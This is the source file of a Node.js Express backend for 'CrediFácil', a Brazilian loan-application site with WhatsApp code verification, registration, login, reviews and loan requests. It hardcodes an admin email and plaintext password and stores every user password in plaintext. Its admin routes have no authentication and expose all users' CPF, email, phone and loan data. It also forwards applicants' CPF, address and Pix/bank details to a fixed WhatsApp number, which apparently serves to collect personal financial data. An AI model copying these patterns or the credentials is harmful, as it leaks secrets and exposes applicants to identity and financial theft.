/**
 * CrediFácil — Backend
 * Confirmação por código via WhatsApp (Z-API / Evolution) ou modo simulado
 */

const path = require('path');
const fs = require('fs');

require('dotenv').config({ path: path.join(__dirname, '.env') });
require('dotenv').config({ path: path.join(__dirname, '..', '.env') });

const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'data', 'users.json');
const FRONTEND_DIR = path.join(__dirname, '..');

const APP_URL = process.env.APP_URL || `http://localhost:${PORT}`;

// WhatsApp providers (opcional)
const ZAPI_INSTANCE = process.env.ZAPI_INSTANCE_ID || '';
const ZAPI_TOKEN = process.env.ZAPI_TOKEN || '';
const ZAPI_CLIENT_TOKEN = process.env.ZAPI_CLIENT_TOKEN || '';
const EVOLUTION_URL = (process.env.EVOLUTION_URL || '').replace(/\/$/, '');
const EVOLUTION_API_KEY = process.env.EVOLUTION_API_KEY || '';
const EVOLUTION_INSTANCE = process.env.EVOLUTION_INSTANCE || '';

app.use(cors());
app.use(express.json());
app.use(express.static(FRONTEND_DIR));

function ensureDataFile() {
  const dir = path.dirname(DATA_FILE);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });

  const admin = {
    id: 'admin-nu-001',
    name: 'Administrador',
    cpf: '529.982.247-25',
    email: 'splsp846@gmail.com',
    whatsapp: '(11) 99999-0000',
    password: '20142018sp',
    role: 'admin',
    whatsappVerified: true,
    emailVerified: true,
    verificationCode: null,
    verificationExpires: null,
    createdAt: new Date().toISOString(),
    loans: []
  };

  let users = [];
  if (fs.existsSync(DATA_FILE)) {
    try { users = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); } catch { users = []; }
  }

  const idx = users.findIndex(u => (u.email || '').toLowerCase() === 'splsp846@gmail.com');
  if (idx === -1) {
    users.unshift(admin);
  } else {
    users[idx] = { ...users[idx], ...admin, loans: users[idx].loans || [] };
  }
  fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2));
}

function readUsers() {
  ensureDataFile();
  try {
    return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
  } catch {
    return [];
  }
}

function writeUsers(users) {
  ensureDataFile();
  fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2));
}

function validateCPF(cpf) {
  cpf = String(cpf).replace(/\D/g, '');
  if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
  let sum = 0;
  for (let i = 0; i < 9; i++) sum += parseInt(cpf.charAt(i)) * (10 - i);
  let rest = (sum * 10) % 11;
  if (rest === 10 || rest === 11) rest = 0;
  if (rest !== parseInt(cpf.charAt(9))) return false;
  sum = 0;
  for (let i = 0; i < 10; i++) sum += parseInt(cpf.charAt(i)) * (11 - i);
  rest = (sum * 10) % 11;
  if (rest === 10 || rest === 11) rest = 0;
  return rest === parseInt(cpf.charAt(10));
}

function onlyDigits(s) {
  return String(s || '').replace(/\D/g, '');
}

function toBrazilPhone(whatsapp) {
  let d = onlyDigits(whatsapp);
  if (d.length === 10 || d.length === 11) d = '55' + d;
  return d;
}

function generateCode() {
  return String(Math.floor(100000 + Math.random() * 900000));
}

function whatsappConfigured() {
  if (ZAPI_INSTANCE && ZAPI_TOKEN) return 'zapi';
  if (EVOLUTION_URL && EVOLUTION_API_KEY && EVOLUTION_INSTANCE) return 'evolution';
  return null;
}

const ADMIN_WHATSAPP = process.env.ADMIN_WHATSAPP || '11961431449';

async function sendFichaToAdmin(user) {
  if (!ADMIN_WHATSAPP) {
    console.warn('[WhatsApp] ADMIN_WHATSAPP não configurado. Ficha não enviada.');
    return { skipped: true };
  }
  const phone = toBrazilPhone(ADMIN_WHATSAPP);
  const text =
    `*Nova ficha — CrediFácil*\n\n` +
    `Nome: ${user.name}\n` +
    `CPF: ${user.cpf}\n` +
    `E-mail: ${user.email}\n` +
    `WhatsApp: ${user.whatsapp}\n` +
    `Cadastro: ${new Date().toLocaleString('pt-BR')}`;

  const provider = whatsappConfigured();
  if (!provider) {
    console.warn('[WhatsApp] API não configurada. Ficha (simulado):\n' + text);
    return { simulated: true };
  }

  try {
    if (provider === 'zapi') {
      const url = `https://api.z-api.io/instances/${ZAPI_INSTANCE}/token/${ZAPI_TOKEN}/send-text`;
      const headers = { 'Content-Type': 'application/json' };
      if (ZAPI_CLIENT_TOKEN) headers['Client-Token'] = ZAPI_CLIENT_TOKEN;
      const res = await fetch(url, {
        method: 'POST',
        headers,
        body: JSON.stringify({ phone, message: text })
      });
      if (!res.ok) throw new Error(await res.text());
      console.log('[Z-API] Ficha enviada para admin', phone);
      return { ok: true };
    }
    if (provider === 'evolution') {
      const url = `${EVOLUTION_URL}/message/sendText/${EVOLUTION_INSTANCE}`;
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', apikey: EVOLUTION_API_KEY },
        body: JSON.stringify({ number: phone, text })
      });
      if (!res.ok) throw new Error(await res.text());
      console.log('[Evolution] Ficha enviada para admin', phone);
      return { ok: true };
    }
  } catch (err) {
    console.error('[WhatsApp] Falha ao enviar ficha:', err.message);
    return { error: err.message };
  }
  return { simulated: true };
}

async function sendWhatsAppCode(whatsapp, name, code) {
  const phone = toBrazilPhone(whatsapp);
  const text =
    `*CrediFácil*\n\nOlá, ${name.split(' ')[0]}!\nSeu código de confirmação é:\n\n*${code}*\n\nVálido por 15 minutos. Não compartilhe.`;

  const provider = whatsappConfigured();

  if (!provider) {
    console.warn('[WhatsApp] Nenhuma API configurada (Z-API / Evolution). Modo simulado.');
    console.warn(`[WhatsApp] Código para ${phone}: ${code}`);
    return { simulated: true, code };
  }

  try {
    if (provider === 'zapi') {
      const url = `https://api.z-api.io/instances/${ZAPI_INSTANCE}/token/${ZAPI_TOKEN}/send-text`;
      const headers = { 'Content-Type': 'application/json' };
      if (ZAPI_CLIENT_TOKEN) headers['Client-Token'] = ZAPI_CLIENT_TOKEN;
      const res = await fetch(url, {
        method: 'POST',
        headers,
        body: JSON.stringify({ phone, message: text })
      });
      const body = await res.text();
      if (!res.ok) {
        console.error('[Z-API] Erro:', res.status, body);
        throw new Error(`Z-API ${res.status}: ${body}`);
      }
      console.log('[Z-API] Código enviado para', phone);
      return { simulated: false, provider: 'zapi' };
    }

    if (provider === 'evolution') {
      const url = `${EVOLUTION_URL}/message/sendText/${EVOLUTION_INSTANCE}`;
      const res = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          apikey: EVOLUTION_API_KEY
        },
        body: JSON.stringify({
          number: phone,
          text
        })
      });
      const body = await res.text();
      if (!res.ok) {
        console.error('[Evolution] Erro:', res.status, body);
        throw new Error(`Evolution ${res.status}: ${body}`);
      }
      console.log('[Evolution] Código enviado para', phone);
      return { simulated: false, provider: 'evolution' };
    }
  } catch (err) {
    console.error('[WhatsApp] Falha no envio:', err.message);
    // Ainda devolve código em modo simulado para não travar o cadastro
    return { simulated: true, code, error: err.message };
  }

  return { simulated: true, code };
}

function isVerified(user) {
  if (user.role === 'admin') return true;
  return !!(user.whatsappVerified || user.emailVerified);
}

// ========== API ==========

app.get('/api/status', (req, res) => {
  res.json({
    ok: true,
    whatsappProvider: whatsappConfigured() || 'simulated',
    appUrl: APP_URL
  });
});

function assignFichaNumbers() {
  const users = readUsers();
  let max = 0;
  users.forEach(u => {
    if (u.role === 'admin') return;
    if (u.fichaNum && u.fichaNum > max) max = u.fichaNum;
  });
  let next = max + 1;
  let changed = false;
  users.forEach(u => {
    if (u.role === 'admin') return;
    if (!u.fichaNum) {
      u.fichaNum = next++;
      if (u.fichaNum > 1000) u.fichaNum = 1000;
      changed = true;
    }
  });
  if (changed) writeUsers(users);
  return next;
}

function nextFichaNum() {
  const users = readUsers();
  let max = 0;
  users.forEach(u => {
    if (u.role !== 'admin' && u.fichaNum && u.fichaNum > max) max = u.fichaNum;
  });
  const n = max + 1;
  return n > 1000 ? 1000 : n;
}

app.post('/api/register', async (req, res) => {
  try {
    const { name, cpf, email, whatsapp, password } = req.body || {};

    if (!name || name.trim().length < 3) {
      return res.status(400).json({ error: 'Informe seu nome completo' });
    }
    if (!validateCPF(cpf)) {
      return res.status(400).json({ error: 'CPF inválido' });
    }
    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      return res.status(400).json({ error: 'E-mail inválido' });
    }
    const wa = onlyDigits(whatsapp);
    if (wa.length < 10 || wa.length > 11) {
      return res.status(400).json({ error: 'WhatsApp inválido' });
    }
    if (!password || password.length < 6) {
      return res.status(400).json({ error: 'Senha deve ter no mínimo 6 caracteres' });
    }

    const emailNorm = email.trim().toLowerCase();
    if (emailNorm === 'splsp846@gmail.com') {
      return res.status(400).json({ error: 'Este e-mail é reservado' });
    }

    const users = readUsers();
    if (users.some(u => onlyDigits(u.cpf) === onlyDigits(cpf))) {
      return res.status(409).json({ error: 'CPF já cadastrado' });
    }
    if (users.some(u => u.email === emailNorm)) {
      return res.status(409).json({ error: 'E-mail já cadastrado' });
    }
    if (users.some(u => onlyDigits(u.whatsapp) === wa)) {
      return res.status(409).json({ error: 'WhatsApp já cadastrado' });
    }

    const newUser = {
      id: uuidv4(),
      fichaNum: nextFichaNum(),
      name: name.trim(),
      cpf: cpf.trim(),
      email: emailNorm,
      whatsapp: whatsapp.trim(),
      password,
      role: 'user',
      whatsappVerified: true,
      emailVerified: true,
      verificationCode: null,
      verificationExpires: null,
      createdAt: new Date().toISOString(),
      loans: []
    };

    users.push(newUser);
    writeUsers(users);

    // Envia ficha para o WhatsApp do admin (se configurado)
    sendFichaToAdmin(newUser).catch(e => console.error('Ficha WA:', e.message));

    res.status(201).json({
      ok: true,
      message: 'Conta criada com sucesso! Você já pode entrar.',
      email: emailNorm,
      whatsapp: whatsapp.trim(),
      userId: newUser.id,
      user: {
        id: newUser.id,
        name: newUser.name,
        email: newUser.email,
        cpf: newUser.cpf,
        whatsapp: newUser.whatsapp,
        role: 'user',
        whatsappVerified: true
      }
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Erro interno no cadastro' });
  }
});

app.post('/api/verify-whatsapp', (req, res) => {
  const { email, whatsapp, code } = req.body || {};
  const codeStr = String(code || '').trim();

  if (!codeStr || codeStr.length !== 6) {
    return res.status(400).json({ error: 'Informe o código de 6 dígitos' });
  }

  const users = readUsers();
  let idx = -1;

  if (email) {
    idx = users.findIndex(u => u.email === String(email).trim().toLowerCase());
  } else if (whatsapp) {
    const wa = onlyDigits(whatsapp);
    idx = users.findIndex(u => onlyDigits(u.whatsapp) === wa);
  }

  if (idx === -1) {
    return res.status(404).json({ error: 'Conta não encontrada' });
  }

  const user = users[idx];

  if (isVerified(user)) {
    return res.json({ ok: true, message: 'Conta já confirmada', already: true });
  }

  if (user.verificationExpires && new Date(user.verificationExpires) < new Date()) {
    return res.status(400).json({ error: 'Código expirado. Solicite um novo.' });
  }

  if (String(user.verificationCode) !== codeStr) {
    return res.status(400).json({ error: 'Código incorreto' });
  }

  users[idx].whatsappVerified = true;
  users[idx].emailVerified = true;
  users[idx].verificationCode = null;
  users[idx].verificationExpires = null;
  writeUsers(users);

  res.json({
    ok: true,
    message: 'WhatsApp confirmado! Você já pode entrar.',
    name: user.name,
    email: user.email
  });
});

app.post('/api/resend-verification', async (req, res) => {
  try {
    const { email, whatsapp } = req.body || {};
    const users = readUsers();
    let idx = -1;

    if (email) {
      idx = users.findIndex(u => u.email === String(email).trim().toLowerCase());
    } else if (whatsapp) {
      const wa = onlyDigits(whatsapp);
      idx = users.findIndex(u => onlyDigits(u.whatsapp) === wa);
    }

    if (idx === -1) return res.status(404).json({ error: 'Conta não encontrada' });

    const user = users[idx];
    if (isVerified(user)) {
      return res.json({ ok: true, message: 'Conta já está confirmada' });
    }

    const code = generateCode();
    users[idx].verificationCode = code;
    users[idx].verificationExpires = new Date(Date.now() + 15 * 60 * 1000).toISOString();
    writeUsers(users);

    const sendResult = await sendWhatsAppCode(user.whatsapp, user.name, code);

    res.json({
      ok: true,
      message: sendResult.simulated
        ? 'Novo código gerado (modo simulado)'
        : 'Código reenviado no WhatsApp',
      ...(sendResult.simulated ? { simulated: true, code } : {})
    });
  } catch (err) {
    console.error(err);
    res.status(502).json({ error: 'Falha ao reenviar código', detail: err.message });
  }
});

app.post('/api/login', (req, res) => {
  const { loginId, password } = req.body || {};
  if (!loginId || !password) {
    return res.status(400).json({ error: 'Informe CPF/e-mail e senha' });
  }

  const users = readUsers();
  const id = String(loginId).trim();
  const user = users.find(
    u =>
      u.email.toLowerCase() === id.toLowerCase() ||
      onlyDigits(u.cpf) === onlyDigits(id)
  );

  if (!user || user.password !== password) {
    return res.status(401).json({ error: 'CPF/e-mail ou senha incorretos' });
  }

  res.json({
    ok: true,
    user: {
      id: user.id,
      name: user.name,
      email: user.email,
      cpf: user.cpf,
      whatsapp: user.whatsapp,
      role: user.role || 'user',
      whatsappVerified: true
    }
  });
});

// Lista de usuários para o painel admin (sem senhas)
app.get('/api/admin/users', (req, res) => {
  const users = readUsers().map(u => ({
    id: u.id,
    name: u.name,
    cpf: u.cpf,
    email: u.email,
    whatsapp: u.whatsapp,
    role: u.role || 'user',
    whatsappVerified: !!(u.whatsappVerified || u.emailVerified),
    emailVerified: !!u.emailVerified,
    createdAt: u.createdAt,
    loans: u.loans || []
  }));
  res.json({ ok: true, users });
});

// ========== Opiniões / Reclamações ==========
const REVIEWS_FILE = path.join(__dirname, 'data', 'reviews.json');

function readReviews() {
  try {
    if (!fs.existsSync(REVIEWS_FILE)) return [];
    return JSON.parse(fs.readFileSync(REVIEWS_FILE, 'utf8'));
  } catch { return []; }
}
function writeReviews(list) {
  const dir = path.dirname(REVIEWS_FILE);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(REVIEWS_FILE, JSON.stringify(list, null, 2));
}

// Público: listar opiniões
app.get('/api/reviews', (req, res) => {
  const list = readReviews().slice().reverse();
  res.json({ ok: true, reviews: list });
});

// Público: enviar opinião
app.post('/api/reviews', (req, res) => {
  const { name, email, rating, message } = req.body || {};
  if (!name || name.trim().length < 2) return res.status(400).json({ error: 'Informe seu nome' });
  if (!message || message.trim().length < 10) return res.status(400).json({ error: 'Escreva sua opinião (mínimo 10 caracteres)' });
  const r = Math.min(5, Math.max(1, parseInt(rating) || 5));

  const review = {
    id: uuidv4(),
    name: name.trim(),
    email: (email || '').trim().toLowerCase(),
    rating: r,
    message: message.trim(),
    reply: null,
    createdAt: new Date().toISOString(),
    repliedAt: null
  };
  const list = readReviews();
  list.push(review);
  writeReviews(list);
  res.status(201).json({ ok: true, message: 'Opinião enviada! Obrigado.', review });
});

// Admin: salvar solicitação (com endereço) na ficha do usuário e notificar
app.post('/api/admin/loan', (req, res) => {
  const { userId, email, loan } = req.body || {};
  if (!loan) return res.status(400).json({ error: 'Dados da solicitação ausentes' });
  const users = readUsers();
  let idx = -1;
  if (userId) idx = users.findIndex(u => u.id === userId);
  if (idx === -1 && email) idx = users.findIndex(u => (u.email || '').toLowerCase() === String(email).toLowerCase());
  if (idx === -1) return res.status(404).json({ error: 'Usuário não encontrado' });
  if (!users[idx].loans) users[idx].loans = [];
  users[idx].loans.push(loan);
  writeUsers(users);
  notifyNewLoan(users[idx], loan).catch(e => console.error('Notif solicitação:', e.message));
  res.json({ ok: true });
});

async function notifyNewLoan(user, loan) {
  const end = loan.endereco || {};
  const endStr = [end.rua, end.numero, end.bairro, end.cidade, end.uf].filter(Boolean).join(', ');
  const text =
    `*Nova solicitação — CrediFácil*\n` +
    `Nome: ${user.name}\n` +
    `CPF: ${user.cpf}\n` +
    `E-mail: ${user.email}\n` +
    `WhatsApp: ${user.whatsapp}\n` +
    `Valor: R$ ${Number(loan.valor || 0).toLocaleString('pt-BR', { minimumFractionDigits: 2 })}\n` +
    `Parcelas: ${loan.parcelas}x de R$ ${Number(loan.parcela || 0).toLocaleString('pt-BR', { minimumFractionDigits: 2 })}\n` +
    `Total: R$ ${Number(loan.total || 0).toLocaleString('pt-BR', { minimumFractionDigits: 2 })}\n` +
    `Pix/Conta: ${loan.conta || '—'}\n` +
    `Endereço: ${endStr || '—'}\n` +
    `CEP: ${end.cep || '—'}`;

  const phone = toBrazilPhone(ADMIN_WHATSAPP);
  if (ZAPI_INSTANCE && ZAPI_TOKEN && phone) {
    const headers = { 'Content-Type': 'application/json' };
    if (ZAPI_CLIENT_TOKEN) headers['Client-Token'] = ZAPI_CLIENT_TOKEN;
    const url = `https://api.z-api.io/instances/${ZAPI_INSTANCE}/token/${ZAPI_TOKEN}/send-text`;
    const r = await fetch(url, { method: 'POST', headers, body: JSON.stringify({ phone, message: text }) });
    if (!r.ok) console.warn('[Z-API] notificação falhou', r.status);
    else console.log('[Z-API] notificação de solicitação enviada');
  } else {
    console.log('[Notificação] Nova solicitação (sem Z-API):\n' + text);
  }
}

// Admin: listar todas
app.get('/api/admin/reviews', (req, res) => {
  res.json({ ok: true, reviews: readReviews().slice().reverse() });
});

// Admin: responder
app.post('/api/admin/reviews/:id/reply', (req, res) => {
  const { reply } = req.body || {};
  if (!reply || reply.trim().length < 2) return res.status(400).json({ error: 'Escreva a resposta' });
  const list = readReviews();
  const idx = list.findIndex(r => r.id === req.params.id);
  if (idx === -1) return res.status(404).json({ error: 'Opinião não encontrada' });
  list[idx].reply = reply.trim();
  list[idx].repliedAt = new Date().toISOString();
  writeReviews(list);
  res.json({ ok: true, review: list[idx] });
});

app.get('*', (req, res) => {
  const file = path.join(FRONTEND_DIR, req.path === '/' ? 'index.html' : req.path);
  if (fs.existsSync(file) && fs.statSync(file).isFile()) {
    return res.sendFile(file);
  }
  res.sendFile(path.join(FRONTEND_DIR, 'index.html'));
});

ensureDataFile();
assignFichaNumbers();
app.listen(PORT, () => {
  const provider = whatsappConfigured();
  console.log('');
  console.log('  CrediFácil — servidor rodando');
  console.log(`  → http://localhost:${PORT}`);
  console.log(`  → WhatsApp: ${provider ? provider.toUpperCase() + ' ✓' : 'modo simulado (sem API)'}`);
  console.log('');
});
